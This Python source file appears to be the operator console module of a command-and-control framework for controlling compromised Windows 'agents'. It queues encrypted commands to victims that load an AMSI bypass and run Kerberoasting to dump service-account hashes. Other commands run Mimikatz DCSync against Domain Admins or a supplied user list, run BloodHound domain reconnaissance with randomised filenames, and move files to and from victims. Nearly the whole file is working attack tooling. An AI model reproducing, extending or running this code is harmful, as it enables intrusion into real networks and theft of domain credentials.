# Embedded file name: core\cmd.py
import base64
from core import config
from core.Encryption import *
from lib import prettytable
from core.color import bcolors
from core.color import *
import time
import os

class cmd:
    COMMANDS = ['exit',
     'show',
     'help',
     'list',
     'use',
     'delete',
     'back',
     'payload',
     'modules',
     'encode64',
     'DA',
     'downloads',
     'kerb',
     'dcsync_admins',
     'dcsync_list',
     'kill_all',
     'delete_all',
     'get_groups',
     'get_users',
     'bloodhound']

    HELPCOMMANDS = [['exit', 'Exit the console , or kill the agent '],
     ['list', 'List all agents'],
     ['help', 'Help menu'],
     ['show', 'Show Command and Controler variables'],
     ['use', 'Interact with AGENT'],
     ['back', 'Back to the main'],
     ['payload', 'Show Payloads'],
     ['load', 'load modules'],
     ['kill_all', 'kill all agents'],
     ['delete', 'delete agent from the list'],
     ['delete_all', 'delete all agents in the list'],
     ['set-beacon', 'set the beacon interval live for agent'],
     ['download', 'download file from the vicitm'],
     ['downloads', 'list downloaded files'],
     ['upload', 'upload files to the victim'],
     ['modules', 'list all the Available modules in Modules directory'],
     ['encode64', 'encode any command to base64 encoded UTF-8 command ( can be decoded in powershell)'],
     ['screenshot', 'take screenshot form  the victim'],
     ['DA', 'Run defense Analysis Module'],
     ['kerb', 'do kerberoast attack  and dump  service accounts hashes'],
     ['dcsync_admins', 'do dcsync attack agains domain admins group'],
     ['dcsync_list', 'do dcsync attack agains custom user list '],
     ['get_groups', 'get all the groups user is member of'],
     ['get_users', 'get all the users member in group'],
     ['bloodhound', 'run bloodhound to collect all the information about the AD']]

    def help(self, args = None):
        table = prettytable.PrettyTable([bcolors.BOLD + 'Command' + bcolors.ENDC, bcolors.BOLD + 'Description' + bcolors.ENDC])
        table.border = False
        table.align = 'l'
        table.add_row(['-------', '-----------'])
        for i in self.HELPCOMMANDS:
            table.add_row([bcolors.OKBLUE + i[0] + bcolors.ENDC, i[1]])

        print table

    def exit(self, args = None):
        if config.get_pointer()=='main':
            os._exit(0)
        else:
            #config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"exit"))
            config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"kill "+config.AGENTS[config.get_pointer()][8]))

    def list(self, args = None):
        table = prettytable.PrettyTable([bcolors.BOLD + 'ID' + bcolors.ENDC,
         bcolors.BOLD + 'Status' + bcolors.ENDC,
         bcolors.BOLD + 'ExternalIP' + bcolors.ENDC,
         bcolors.BOLD + 'InternalIP' + bcolors.ENDC,
         bcolors.BOLD + 'OS' + bcolors.ENDC,
         bcolors.BOLD + 'Arch' + bcolors.ENDC,
         bcolors.BOLD + 'ComputerName' + bcolors.ENDC,
         bcolors.BOLD + 'Username' + bcolors.ENDC,
         bcolors.BOLD + 'PID' + bcolors.ENDC])
        table.border = False
        table.align = 'l'
        table.add_row(['--',
         '------',
         '----------',
         '----------',
         '--',
         '----',
         '------------',
         '--------',
         '----'])
        for i in config.AGENTS:
            status = time.time() - config.TIME[i]
            table.add_row([bcolors.OKBLUE + str(config.AGENTS[i][0]) + bcolors.ENDC,
             status,
             config.AGENTS[i][1],
             config.AGENTS[i][3],
             config.AGENTS[i][2].split('|')[0],
             config.AGENTS[i][4],
             config.AGENTS[i][5],
             config.AGENTS[i][6] + '\\' + config.AGENTS[i][7],
             config.AGENTS[i][8]])

        print table

    def use(self, args = None):
        if len(args) < 2:
            return
        id = args[1]
        for i in config.AGENTS:
            if id == str(config.AGENTS[i][0]):
                id = i
                config.set_pointer(i)
                break

    def kill_all(self, args = None):
        if config.get_pointer()!='main':
            config.set_pointer('main')
        for i in config.AGENTS:
            config.COMMAND[i].append(encrypt(config.AESKey,"kill "+config.AGENTS[i][8]))

    def delete_all(self, args = None):
        if config.get_pointer()!='main':
            config.set_pointer('main')
        config.AGENTS.clear()

    def delete(self, args = None):
        if config.get_pointer()!='main':
            config.set_pointer('main')
        if len(args) < 2:
            print "delete <id>"
            return
        id = args[1]
        agent=''
        for i in config.AGENTS:
            if id == str(config.AGENTS[i][0]):
                agent=i
                break
        if agent!='':
            del config.AGENTS[agent]

    def back(self, args = None):
        config.set_pointer('main')

    def payload(self, args = None):
        for i in config.PAYLOADS:
            print i
            print ''

    def show(self, args = None):
        pass

    def load(self, args=None):
        if config.get_pointer()=='main':
            print "you can't use this command in main ! chose an agent"
            return
        fpm = open('Modules/' + args[1], 'r')
        module = fpm.read()
        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,module))
        fpm.close()

    def downloads(self, args=None):
        if config.get_pointer()=='main':
            print "you can't use this command in main ! chose an agent"
            return
    	if os.path.isdir("downloads"):
    		downloads = os.listdir("downloads")
    		for file in downloads:
    			print file
    	else:
    		print "[-] downloads directory not Available"

    def modules(self, args=None):
    	if os.path.isdir("Modules"):
    		modules = os.listdir("Modules")
    		for module in modules:
    			print module
    	else:
    		print "[-] modules directory not Available"

    def encode64(self, args=None):
        if len(args) > 1:
            b64=""
            #for i in args[1:]:
            #    b64=b64+i+" "
            b64=' '.join(args[1:])
            print b64
            print "encoded command :  "+base64.b64encode(b64.encode('UTF-16LE')).decode("utf-8")
        else:
            print "[-] please add your command as argument : encode64 <command>"

    def DA(self, args=None):
        if config.get_pointer()=='main':
            print "you can't use this command in main ! chose an agent"
            return
        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load ASBBypass.ps1"))
        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load PowerView.ps1"))
        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load DA.ps1"))

    def kerb(self, args=None):
        if config.get_pointer()=='main':
            print "you can't use this command in main ! chose an agent"
            return
        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load ASBBypass.ps1"))
        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load Find-PSServiceAccounts.ps1"))
        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load Invoke-Kerberoast.ps1"))
        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load kerb.ps1"))

    def dcsync_admins(self, args=None):
        if config.get_pointer()=='main':
            print "you can't use this command in main ! chose an agent"
            return
        print "grab some coffe this may take too long to finish if the domain admin users are more than 10"
        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load Invoke-Mimikatz.ps1"))
        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"""$users=(Get-ADGroupMember -Identity "Domain Admins").SamAccountName;For ($i=0; $i -le $users.Length; $i=$i+5) {echo $users[$i..($i+4)] | ForEach-Object  { $t='"lsadump::dcsync /user:rep"';$t=$t.replace("rep",$_);Invoke-Mimikatz -Command $t}}"""))

    def dcsync_list(self, args=None):
        if config.get_pointer()=='main':
            print "you can't use this command in main ! chose an agent"
            return
        user=[]
        try :
            if len(args) < 2:
                print "Usage dcsunc_list <full file path>"
                return
            print "grab some coffe this may take too long to finish if the users are more than 10"
            if len(' '.join(args[1:]).split(","))>1:
                users=' '.join(args[1:]).replace(", ",",").replace(" ,",",")
            else:
                list = open(args[1], 'r')
                users = list.read()
                list.close()
                users=users.replace("\n",",")
                users="".join(users)
            config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load Invoke-Mimikatz.ps1"))
            config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"""$users=("{users}").split(",");For ($i=0; $i -le $users.Length; $i=$i+5) {echo $users[$i..($i+4)] | ForEach-Object  { $t='"lsadump::dcsync /user:rep"';$t=$t.replace("rep",$_);Invoke-Mimikatz -Command $t}}""".replace("{users}",users)))
        except Exception as e:
            print e

    def get_groups(self, args=None):
        if config.get_pointer()=='main':
            print "you can't use this command in main ! chose an agent"
            return
        try :
            if len(args) < 2:
                print "Usage get_groups <user name>"
                return
            user=' '.join(args[1:])
            config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load PowerView.ps1"))
            user="""(New-Object System.DirectoryServices.DirectorySearcher("(&(objectCategory=User)(samAccountName=$("{user}")))")).FindOne().GetDirectoryEntry().memberOf""".replace("{user}",user)
            config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,user))
        except Exception as e:
            print e

    def get_users(self, args=None):
        if config.get_pointer()=='main':
            print "you can't use this command in main ! chose an agent"
            return
        try :
            if len(args) < 2:
                print "Usage get_users <group name>"
                return
            group=' '.join(args[1:])
            config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load PowerView.ps1"))
            group="""Get-DomainGroupMember -Identity "{group}" -Recurse""".replace("{group}",group)
            config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,group))
        except Exception as e:
            print e

    def bloodhound(self, args=None):
        if config.get_pointer()=='main':
            print "you can't use this command in main ! chose an agent"
            return
        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load SharpHound.ps1"))
        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"Invoke-BloodHound -CollectionMethod All -NoSaveCache -RandomFilenames -ZipFileName "+"".join([random.choice(string.ascii_uppercase) for i in range(5)])))
